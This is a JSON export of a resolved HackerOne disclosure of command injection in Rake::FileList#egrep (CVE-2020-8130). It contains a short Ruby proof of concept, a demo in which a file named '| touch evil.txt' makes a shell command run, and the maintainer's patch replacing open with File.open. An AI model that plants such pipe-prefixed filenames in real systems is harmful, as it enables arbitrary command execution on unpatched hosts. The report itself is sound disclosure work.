{"id":651518,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NTE1MTg=","url":"https://hackerone.com/reports/651518","title":"OS Command Injection via egrep in Rake::FileList","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2019-07-20T04:16:53.118Z","submitted_at":"2019-07-20T04:16:53.118Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kyoshida","url":"/kyoshida","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/552/065/33fa47f14eb6a161e348728862da35f800c99f7a_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8130"],"singular_disclosure_disabled":false,"disclosed_at":"2019-08-29T03:12:56.050Z","bug_reporter_agreed_on_going_public_at":"2019-08-29T03:12:55.979Z","team_member_agreed_on_going_public_at":"2019-08-29T01:44:19.999Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"When a file which has command file name of stating with `|` is in `Rake::FileList`, then `egrep` will execute the command.\n\n# How to reproduce\n\nPoC (`poc_rake.rb`) is the following.\n\n```ruby\nrequire 'rake'\n\nlist = Rake::FileList.new(Dir.glob('*'))\np list\nlist.egrep(/something/)\n```\n\nExample of executing.\n\n```\n% ls -1\nGemfile\nGemfile.lock\npoc_rake.rb\nvendor\n| touch evil.txt\n% bundle exec ruby poc_rake.rb\n[\"poc_rake.rb\", \"Gemfile\", \"Gemfile.lock\", \"| touch evil.txt\", \"vendor\"]\npoc_rake.rb:6:list.egrep(/something/)\nError while processing 'vendor': Is a directory @ io_fillbuf - fd:7 vendor\n% ls -1\nGemfile\nGemfile.lock\nevil.txt\npoc_rake.rb\nvendor\n| touch evil.txt\n```\n\n`evil.txt` was created.\n\n## Impact\n\nAn attacker must deploy a file containing command names in the target environment, assuming that this attack is successful. If that would be a serious problem.","vulnerability_information_html":"\u003cp\u003eWhen a file which has command file name of stating with \u003ccode\u003e|\u003c/code\u003e is in \u003ccode\u003eRake::FileList\u003c/code\u003e, then \u003ccode\u003eegrep\u003c/code\u003e will execute the command.\u003c/p\u003e\n\n\u003ch1 id=\"how-to-reproduce\"\u003eHow to reproduce\u003c/h1\u003e\n\n\u003cp\u003ePoC (\u003ccode\u003epoc_rake.rb\u003c/code\u003e) is the following.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;rake\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003elist\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eRake\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eFileList\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003eDir\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eglob\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;*\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ep\u003c/span\u003e \u003cspan class=\"n\"\u003elist\u003c/span\u003e\n\u003cspan class=\"n\"\u003elist\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eegrep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/something/\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eExample of executing.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e% ls -1\nGemfile\nGemfile.lock\npoc_rake.rb\nvendor\n| touch evil.txt\n% bundle exec ruby poc_rake.rb\n[\u0026quot;poc_rake.rb\u0026quot;, \u0026quot;Gemfile\u0026quot;, \u0026quot;Gemfile.lock\u0026quot;, \u0026quot;| touch evil.txt\u0026quot;, \u0026quot;vendor\u0026quot;]\npoc_rake.rb:6:list.egrep(/something/)\nError while processing \u0026#39;vendor\u0026#39;: Is a directory @ io_fillbuf - fd:7 vendor\n% ls -1\nGemfile\nGemfile.lock\nevil.txt\npoc_rake.rb\nvendor\n| touch evil.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003eevil.txt\u003c/code\u003e was created.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker must deploy a file containing command names in the target environment, assuming that this attack is successful. If that would be a serious problem.\u003c/p\u003e\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":59,"name":"OS Command Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-09-28T01:44:20.070Z","allow_singular_disclosure_after":-39588571.71150197,"singular_disclosure_allowed":true,"vote_count":61,"voters":["bl4de","mik317","sameerphad72","mygf","karmadylo","0-1","everping","nessun00x","khizer47","exception","and 51 more..."],"structured_scope":{"databaseId":28212,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/ruby/ruby","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5377863,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-20T10:43:10.179Z","updated_at":"2019-07-20T10:43:10.179Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5377890,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I confirmed. How about the following patch for this issue?\n\n```\ndiff --git lib/rake/file_list.rb lib/rake/file_list.rb\nindex 15ea4b3..22c339f 100644\n--- lib/rake/file_list.rb\n+++ lib/rake/file_list.rb\n@@ -294,7 +294,7 @@ module Rake\n       matched = 0\n       each do |fn|\n         begin\n-          open(fn, \"r\", *options) do |inf|\n+          File.open(fn, \"r\", *options) do |inf|\n             count = 0\n             inf.each do |line|\n               count += 1\n```\n","markdown_message":"\u003cp\u003eI confirmed. How about the following patch for this issue?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git lib/rake/file_list.rb lib/rake/file_list.rb\nindex 15ea4b3..22c339f 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- lib/rake/file_list.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ lib/rake/file_list.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -294,7 +294,7 @@\u003c/span\u003e module Rake\n       matched = 0\n       each do |fn|\n         begin\n\u003cspan class=\"gd\"\u003e-          open(fn, \u0026quot;r\u0026quot;, *options) do |inf|\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+          File.open(fn, \u0026quot;r\u0026quot;, *options) do |inf|\n\u003c/span\u003e             count = 0\n             inf.each do |line|\n               count += 1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-07-20T11:00:07.537Z","updated_at":"2019-07-20T11:00:07.537Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5377971,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It looks good. Thanks.","markdown_message":"\u003cp\u003eIt looks good. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-20T11:19:52.917Z","updated_at":"2019-07-20T11:19:52.917Z","actor":{"username":"kyoshida","cleared":false,"url":"/kyoshida","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/552/065/33fa47f14eb6a161e348728862da35f800c99f7a_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5384188,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I released rake-12.3.3.\n\nhttps://rubygems.org/gems/rake/versions/12.3.3\n\nThis issue seems vulnerable like https://www.ruby-lang.org/en/news/2017/12/14/net-ftp-command-injection-cve-2017-17405/. But the attack surface was limited because if It's difficult to inject malicious input to `Rake::FileList` by attackers with the current usage of Rake in the world.","markdown_message":"\u003cp\u003eI released rake-12.3.3.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://rubygems.org/gems/rake/versions/12.3.3\" href=\"/redirect?url=https%3A%2F%2Frubygems.org%2Fgems%2Frake%2Fversions%2F12.3.3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://rubygems.org/gems/rake/versions/12.3.3\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis issue seems vulnerable like \u003ca title=\"https://www.ruby-lang.org/en/news/2017/12/14/net-ftp-command-injection-cve-2017-17405/\" href=\"/redirect?url=https%3A%2F%2Fwww.ruby-lang.org%2Fen%2Fnews%2F2017%2F12%2F14%2Fnet-ftp-command-injection-cve-2017-17405%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.ruby-lang.org/en/news/2017/12/14/net-ftp-command-injection-cve-2017-17405/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. But the attack surface was limited because if It\u0026#39;s difficult to inject malicious input to \u003ccode\u003eRake::FileList\u003c/code\u003e by attackers with the current usage of Rake in the world.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-22T01:44:47.265Z","updated_at":"2019-07-22T01:44:47.265Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5384189,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-22T01:45:01.447Z","updated_at":"2019-07-22T01:45:01.447Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"kyoshida","url":"/kyoshida"},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5384190,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-22T01:46:02.223Z","updated_at":"2019-07-22T01:46:02.223Z","actor":{"url":"/ruby","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ruby","collaborator":{"username":"kyoshida","url":"/kyoshida"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5687109,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-29T01:44:20.018Z","updated_at":"2019-08-29T01:44:20.018Z","first_to_agree":true,"actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5687282,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-29T03:12:55.998Z","updated_at":"2019-08-29T03:12:55.998Z","actor":{"username":"kyoshida","cleared":false,"url":"/kyoshida","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/552/065/33fa47f14eb6a161e348728862da35f800c99f7a_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5687283,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-29T03:12:56.068Z","updated_at":"2019-08-29T03:12:56.068Z","actor":{"username":"kyoshida","cleared":false,"url":"/kyoshida","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/552/065/33fa47f14eb6a161e348728862da35f800c99f7a_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}